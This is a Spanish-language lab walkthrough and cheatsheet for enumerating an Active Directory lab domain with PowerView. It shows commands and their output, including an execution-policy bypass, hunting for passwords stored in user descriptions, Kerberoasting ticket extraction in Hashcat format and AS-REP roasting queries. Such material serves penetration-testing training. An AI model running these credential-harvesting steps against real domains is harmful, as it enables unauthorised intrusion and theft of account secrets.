
# PowerView Enumeration

#### Relacionado

{% content-ref url="/pages/UV1TNVrBn6WwxvY9diA5" %}
[PowerView](/ethical-hacking-cheatsheet/active-directory/active-directory/enumeracion-en-ad/powerview.md)
{% endcontent-ref %}

## <mark style="color:$primary;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="194"></th><th></th></tr></thead><tbody><tr><td><strong>Objetivo</strong></td><td><strong>Comando PowerView</strong></td></tr><tr><td>Dominio</td><td><code>Get-NetDomain</code></td></tr><tr><td>Usuarios</td><td><code>Get-NetUser</code></td></tr><tr><td>Computadoras</td><td><code>Get-NetComputer</code></td></tr><tr><td>Grupos</td><td><code>Get-DomainGroup</code></td></tr><tr><td>Shares</td><td><code>Find-DomainShare -CheckShareAccess</code></td></tr><tr><td>GPOs</td><td><code>Get-NetGPO</code></td></tr><tr><td>OUs</td><td><code>Get-NetOU</code></td></tr><tr><td>Trusts</td><td><code>Get-NetDomainTrust</code></td></tr><tr><td>ACLs interesantes</td><td><code>Find-InterestingDomainAcl -ResolveGUIDs</code></td></tr><tr><td>Kerberoast</td><td><code>Get-DomainUser -SPN</code></td></tr><tr><td>AS-REP Roast</td><td><code>Get-DomainUser -UACFilter DONT_REQ_PREAUTH</code></td></tr></tbody></table>

***

## <mark style="color:$primary;">Lab:</mark> <mark style="color:$primary;"></mark><mark style="color:$primary;">**PowerView Enumeration**</mark>

En este entorno de laboratorio, tendrá acceso a la interfaz gráfica de usuario (GUI) de una máquina Windows (2012). Esta máquina actuará como su máquina atacante. Su tarea en este laboratorio consiste en enumerar el entorno de Active Directory.

**Objetivo: Realizar la enumeración de Active Directory.**

A continuación se detallan las tareas que debe realizar:

* Enumerar usuarios y grupos locales
* Enumerar dominio
* Enumerar Domain Users
* Enumerar Domain Computers
* Enumerar Domain Groups
* Enumerar Domain Shares
* Enumerar GPOs y OUs
* Enumerar Domain Trust y Forest Trust
* Enumerar ACLs
* Encuentra cuentas Kerberoastables
* Encuentra cuentas AS-REP Roastables

**Nota:** Todas las herramientas se encuentran en el directorio **C:\Tools** .

***

### Importar PowerView

```bash
# Bypass la política de ejecución
powershell -ep bypass
Import-Module .\PowerView.ps1
```

### Enumerar usuarios y grupos locales

```powershell
PS C:\Tools> Get-LocalUser

Name          Enabled Description
----          ------- -----------
Administrator True    Built-in account for administering the computer/domain
Guest         False   Built-in account for guest access to the computer/domain
```

```powershell
PS C:\Tools> Get-LocalGroup

Name                                Description
----                                -----------
WinRMRemoteWMIUsers__               Members of this group can access WMI resources over management protocols (such a...
Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission...
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Authorities in the...
Cryptographic Operators             Members are authorized to perform cryptographic operations.
Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this ...
Event Log Readers                   Members of this group can read event logs from local machine
Guests                              Guests have the same access as members of the Users group by default, except for...
Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of H...
IIS_IUSRS                           Built-in group used by Internet Information Services.
Network Configuration Operators     Members in this group can have some administrative privileges to manage configur...
Performance Log Users               Members of this group may schedule logging of performance counters, enable trace...
Performance Monitor Users           Members of this group can access performance counter data locally and remotely
Power Users                         Power Users are included for backwards compatibility and possess limited adminis...
Print Operators                     Members can administer printers installed on domain controllers
RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteA...
RDS Management Servers              Servers in this group can perform routine administrative actions on servers runn...
RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual de...
Remote Desktop Users                Members in this group are granted the right to logon remotely
Remote Management Users             Members of this group can access WMI resources over management protocols (such a...
Replicator                          Supports file replication in a domain
Users                               Users are prevented from making accidental or intentional system-wide changes an...
```

### Enumerar dominio

```bash
PS C:\Tools> Get-NetDomain

Forest                  : SECURITY.local
DomainControllers       : {prod.research.SECURITY.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : SECURITY.local
PdcRoleOwner            : prod.research.SECURITY.local
RidRoleOwner            : prod.research.SECURITY.local
InfrastructureRoleOwner : prod.research.SECURITY.local
Name                    : research.SECURITY.local
```

```powershell
PS C:\Tools> Get-NetDomainController

Forest                     : SECURITY.local
CurrentTime                : 4/15/2026 8:50:02 PM
HighestCommittedUsn        : 73797
OSVersion                  : Windows Server 2012 R2 Standard
Roles                      : {PdcRole, RidRole, InfrastructureRole}
Domain                     : research.SECURITY.local
IPAddress                  : 10.0.0.165
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {b611dabd-4abb-423b-9163-8df96997e2e0}
OutboundConnections        : {96350cb4-e7cf-4854-b531-00320b4e9a54}
Name                       : prod.research.SECURITY.local
Partitions                 : {CN=Configuration,DC=SECURITY,DC=local, CN=Schema,CN=Configuration,DC=SECURITY,DC=local,
                             DC=ForestDnsZones,DC=SECURITY,DC=local, DC=research,DC=SECURITY,DC=local...}
```

```powershell
PS C:\Tools> Get-DomainPolicy

Unicode        : @{Unicode=yes}
SystemAccess   : @{MinimumPasswordAge=0; MaximumPasswordAge=-1; MinimumPasswordLength=0; PasswordComplexity=0;
                 PasswordHistorySize=24; LockoutBadCount=0; RequireLogonToChangePassword=0;
                 ForceLogoffWhenHourExpire=0; ClearTextPassword=0; LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\research.SECURITY.local\sysvol\research.SECURITY.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F
                 9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

```powershell
PS C:\Tools> Get-DomainSID
S-1-5-21-1693200156-3137632808-1858025440
```

### Enumerar Domain Users

```bash
# Listar todos los usuarios
Get-NetUser

# Filtrar propiedades específicas
Get-NetUser | select samaccountname, description, pwdlastset, badpwdcount, logoncount

# Buscar descripciones que puedan contener credenciales
Get-NetUser | select name, description | where {$_.description -ne $null}

# Usuarios con contraseña almacenada en atributos
Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword
```

#### Crear lista de usuarios

```bash
PS C:\Tools> Get-DomainUser | Select-Object -ExpandProperty cn | out-File users.txt
PS C:\Tools> cat .\users.txt
Administrator
Guest
krbtgt
groupmanager
AUGUST_HANSEN
KARL_MCCALL
CLARICE_PEREZ
FREDA_SERRANO
JAMAL_RIGGS
ROWENA_DALTON
ROBBY_BUCKLEY
GAVIN_CAMPOS
VINCENT_WARE
JERMAINE_BARBER
EMILE_GENTRY
BROOKS_KIRBY
<---SNIP--->
```

#### Contraseña en la descripción

```powershell
Get-NetUser | select name, description | where {$_.description -ne $null}

AUGUSTINE_ROMAN    Just so I dont forget my password is J%iKej9WvzSaxUszbT2BECRQ
RODOLFO_JOHNS      Just so I dont forget my password is KqQ6nxznAx36cgZNP3CgY...
LOU_BENJAMIN       Just so I dont forget my password is &yFAjc72NkJkRNUr3G6F#!
```

### Enumerar Domain Computers

```bash
# Listar todas las computadoras del dominio
Get-NetComputer

# Filtrar por sistema operativo
Get-NetComputer | select samaccountname, operatingsystem, dnshostname

# Computadoras con sistema operativo desactualizado
Get-NetComputer -Unconstrained
```

### Ver Domain Computers

```powershell
PS C:\Tools> Get-NetComputer | select name

name
----
PROD
OGCWCTRX1000000
ITSWCTRX1000000
BDEWSECS1000000
AZRWVIR1000000
BDEWSECS1000001
ESMWWKS1000000
FINWWEBS1000000
BDEWAPPS1000000
SECWCTRX1000000
TSTWLPT1000000
HREWAPPS1000000
OGCWAPPS1000000
AZRWWKS1000000
<---SNIP--->
```

#### FIltrar por sistema operativo

```powershell
PS C:\Tools> Get-NetComputer | select samaccountname, operatingsystem, dnshostname

samaccountname   operatingsystem                 dnshostname
--------------   ---------------                 -----------
PROD$            Windows Server 2012 R2 Standard prod.research.SECURITY.local
OGCWCTRX1000000$
ITSWCTRX1000000$
BDEWSECS1000000$
AZRWLPT1000003$
GOOWVIR1000005$
<---SNIP--->
CLIENT$          Windows Server 2012 R2 Standard client.research.SECURITY.local
```

### S.O. Desactualizado

```powershell
PS C:\Tools> Get-NetComputer -Unconstrained

pwdlastset                    : 5/31/2023 9:35:41 AM
logoncount                    : 40
msds-generationid             : {235, 67, 37, 236...}
serverreferencebl             : CN=PROD,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=SECURITY,DC=
                                local
badpasswordtime               : 1/1/1601 12:00:00 AM
distinguishedname             : CN=PROD,OU=Domain Controllers,DC=research,DC=SECURITY,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 4/15/2026 8:41:57 PM
name                          : PROD
objectsid                     : S-1-5-21-1693200156-3137632808-1858025440-1009
samaccountname                : PROD$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
whenchanged                   : 4/15/2026 8:41:57 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2012 R2 Standard
instancetype                  : 4
msdfsr-computerreferencebl    : CN=PROD,CN=Topology,CN=Domain System
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=research,DC=SECURITY,DC=local
objectguid                    : 83c1f999-155e-4605-9de8-37b616c9837e
operatingsystemversion        : 6.3 (9600)
lastlogoff                    : 1/1/1601 12:00:00 AM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=SECURITY,DC=local
dscorepropagationdata         : {6/2/2023 3:28:39 AM, 6/2/2023 3:28:39 AM, 6/2/2023 3:28:38 AM, 6/2/2023 3:28:38 AM...}
serviceprincipalname          : {ldap/prod.research.SECURITY.local/DomainDnsZones.research.SECURITY.local,
                                ldap/prod.research.SECURITY.local/ForestDnsZones.SECURITY.local,
                                Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/prod.research.SECURITY.local,
                                TERMSRV/PROD...}
usncreated                    : 12293
lastlogon                     : 4/15/2026 8:42:11 PM
badpwdcount                   : 0
cn                            : PROD
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 9/27/2021 9:21:24 AM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 73762
ridsetreferences              : CN=RID Set,CN=PROD,OU=Domain Controllers,DC=research,DC=SECURITY,DC=local
dnshostname                   : prod.research.SECURITY.local
```

### Enumerar Domain Groups

```powershell
# Listar todos los grupos
Get-DomainGroup
Get-DomainGroup | select name

# Grupos específicos y sus miembros
Get-DomainGroup -GroupName "Domain Admins"
Get-DomainGroup -GroupName "Enterprise Admins"

# Miembros efectivos de un grupo (con recursión)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Grupos con miembros de otros dominios
Get-DomainForeignGroupMember
```

#### Enumerar Grupos

```powershell
PS C:\Tools> Get-DomainGroup | select name

name
----
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
<----SNIP---->
```

#### Enumerar miembros de un Grupo

{% hint style="info" %}
Se puede filtrar solo el nombre añadiendo al final `| select MemberName`
{% endhint %}

```powershell
PS C:\Tools> Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : research.SECURITY.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=research,DC=SECURITY,DC=local
MemberDomain            : research.SECURITY.local
MemberName              : 8851527393SA
MemberDistinguishedName : CN=8851527393SA,OU=Staging,OU=Admin,DC=research,DC=SECURITY,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-1693200156-3137632808-1858025440-1960

GroupDomain             : research.SECURITY.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=research,DC=SECURITY,DC=local
MemberDomain            : research.SECURITY.local
MemberName              : ELISE_GUZMAN
MemberDistinguishedName : CN=ELISE_GUZMAN,OU=Test,OU=SEC,OU=Stage,DC=research,DC=SECURITY,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-1693200156-3137632808-1858025440-1745

GroupDomain             : research.SECURITY.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=research,DC=SECURITY,DC=local
MemberDomain            : research.SECURITY.local
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=research,DC=SECURITY,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-1693200156-3137632808-1858025440-500
```

### Enumerar Domain Shares

```powershell
# Encontrar shares en el dominio
Find-DomainShare

# Solo shares accesibles por el usuario actual
Find-DomainShare -CheckShareAccess

# Enumerar archivos en shares encontrados
Invoke-ShareFinder
```

### Enumerar GPOs y OUs

```powershell
# GPOs
Get-NetGPO
Get-NetGPO | select displayname, whenchanged, description

# OUs organizacionales
Get-NetOU

# Obtener GPOs aplicados a una OU específica
Get-NetGPO -GPOName "Nombre del GPO"
```

#### Enumerar GPOs

```powershell
PS C:\Tools> Get-NetGPO

usncreated               : 7908
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EA
                           C-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00
                           C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 10/2/2021 11:11:15 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 20505
dscorepropagationdata    : {6/2/2023 3:28:39 AM, 6/2/2023 3:28:39 AM, 6/2/2023 3:28:39 AM, 6/2/2023 3:28:38 AM...}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\research.SECURITY.local\sysvol\research.SECURITY.local\Policies\{31B2F340-016D-11D2-945F-0
                           0C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=research,DC=SECURITY,DC=l
                           ocal
whencreated              : 9/27/2021 9:19:52 AM
versionnumber            : 11
instancetype             : 4
objectguid               : 2501cab0-bdaf-4544-b1c4-fcaf064cf574
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=SECURITY,DC=local
```

#### GPOs reducido

```powershell
PS C:\Tools> Get-NetGPO | select displayname, whenchanged, description

displayname                       whenchanged           description
-----------                       -----------           -----------
Default Domain Policy             10/2/2021 11:11:15 AM
Default Domain Controllers Policy 9/27/2021 9:19:52 AM
NewUsersPolicy1                   6/2/2023 3:35:47 AM
NewCompPolicy2                    6/2/2023 3:44:04 AM
TestPolicy                        6/2/2023 3:49:01 AM
GeneralUserPolicy                 6/2/2023 3:55:36 AM
GenCompPolicy                     6/2/2023 3:59:03 AM
```

#### Enumerar OUs

```powershell
PS C:\Tools> Get-NetOU | select name

name
----
Domain Controllers
Admin
Tier 0
T0-Accounts
T0-Servers
T0-Devices
T0-Permissions
T0-Roles
Tier 1
T1-Accounts
T1-Servers
T1-Devices
T1-Permissions
T1-Roles
Tier 2
T2-Accounts
T2-Servers
T2-Devices
T2-Permissions
T2-Roles
Staging
ServiceAccounts
Groups
<----SNIP---->
```

### Enumerar Domain Trust y Forest Trust

```powershell
# Trusts del dominio actual
Get-NetDomainTrust

# Mapeo completo de trusts
Get-DomainTrustMapping

# Trusts del bosque
Get-NetForestTrust

# Información del bosque
Get-NetForest
Get-NetForestDomain

# Usuarios con privilegios en otros dominios
Get-DomainForeignUser

# Global Catalog
Get-ForestGlobalCatalog
```

#### Trusts del dominio actual

```powershell
PS C:\Tools> Get-NetDomainTrust

SourceName      : research.SECURITY.local
TargetName      : SECURITY.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 9/27/2021 9:19:53 AM
WhenChanged     : 4/15/2026 8:56:24 PM
```

#### Trusts del Forest

```powershell
PS C:\Tools> Get-NetForestTrust

TopLevelNames            : {tech.local}
ExcludedTopLevelNames    : {}
TrustedDomainInformation : {tech.local}
SourceName               : SECURITY.local
TargetName               : tech.local
TrustType                : Forest
TrustDirection           : Bidirectional
```

#### Enumerar Forest

```powershell
PS C:\Tools> Get-NetForest

RootDomainSid         : S-1-5-21-2496296497-1864299928-297538345
Name                  : SECURITY.local
Sites                 : {Default-First-Site-Name}
Domains               : {research.SECURITY.local, SECURITY.local}
GlobalCatalogs        : {dc2012.SECURITY.local, prod.research.SECURITY.local}
ApplicationPartitions : {DC=DomainDnsZones,DC=research,DC=SECURITY,DC=local, DC=ForestDnsZones,DC=SECURITY,DC=local,
                        DC=DomainDnsZones,DC=SECURITY,DC=local}
ForestModeLevel       : 5
ForestMode            : Windows8Forest
RootDomain            : SECURITY.local
Schema                : CN=Schema,CN=Configuration,DC=SECURITY,DC=local
SchemaRoleOwner       : dc2012.SECURITY.local
NamingRoleOwner       : dc2012.SECURITY.local
```

#### Forest Domain

```powershell
PS C:\Tools> Get-NetForestDomain

Forest                  : SECURITY.local
DomainControllers       : {prod.research.SECURITY.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : SECURITY.local
PdcRoleOwner            : prod.research.SECURITY.local
RidRoleOwner            : prod.research.SECURITY.local
InfrastructureRoleOwner : prod.research.SECURITY.local
Name                    : research.SECURITY.local

Forest                  : SECURITY.local
DomainControllers       : {dc2012.SECURITY.local}
Children                : {research.SECURITY.local}
DomainMode              : Windows8Domain
DomainModeLevel         : 5
Parent                  :
PdcRoleOwner            : dc2012.SECURITY.local
RidRoleOwner            : dc2012.SECURITY.local
InfrastructureRoleOwner : dc2012.SECURITY.local
Name                    : SECURITY.local
```

### Enumerar ACLs

```powershell
# Escanear ACLs interesantes en el dominio
Find-InterestingDomainAcl -ResolveGUIDs

# ACLs de un objeto específico
Get-ObjectAcl -SamAccountName "usuario" -ResolveGUIDs

# Escaneo completo de ACLs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName, ObjectDN, ActiveDirectoryRights

# ACLs en AdminSDHolder (especialmente peligroso)
Get-DomainObjectAcl -SearchBase "CN=AdminSDHolder,CN=System,DC=dominio,DC=local" | %{ $_.SecurityIdentifier } | Convert-SidToName
```

#### 10. Encontrar cuentas Kerberoasteables

```powershell
# Enumerar usuarios con SPN (Service Principal Name)
Get-DomainUser -SPN

# Obtener tickets TGS para cracking
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat

# Usar Invoke-Kerberoast (función avanzada)
Invoke-Kerberoast -OutputFormat Hashcat
```

#### 11. Encontrar cuentas AS-REP Roasteables

```powershell
# Enumerar cuentas con DONT_REQ_PREAUTH habilitado [citation:3]
Get-DomainUser -UACFilter DONT_REQ_PREAUTH

# También se puede hacer con LDAPFilter
Get-DomainUser -LDAPFilter "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# Verificar atributo específico
Get-DomainUser -Properties samaccountname,useraccountcontrol | where {$_.useraccountcontrol -like "*DONT_REQ_PREAUTH*"}
```

### Automatización con Invoke-ADEnum

Si quieres automatizar **todo el proceso de una sola vez**, usa `Invoke-ADEnum` :

```powershell
# Enumeración completa (puede tomar mucho tiempo)
Invoke-ADEnum -Workstations -DomainUsers -Shares -FindLocalAdminAccess -DomainACLs -MoreGPOs -DomainOUs -MoreOUs -FindDomainUserLocation -AllGroups

# Enumeración básica con output a archivo
Invoke-ADEnum -Output C:\temp\AD_Report.txt

# Enumeración específica de dominio
Invoke-ADEnum -Domain contoso.local -Server DC01.contoso.local
```

### Cuentas AS-REP Roasteables

```powershell
PS C:\Tools> Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, name

samaccountname userprincipalname              name
-------------- -----------------              ----
johnny         johnny@research.security.local johnny
```

{% hint style="success" %}
Explotamos estas técnicas en detalle en la sección [Actve Directory Penetration Testing CTF 1](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/active-directory-penetration-testing-ctf-1.md)
{% endhint %}
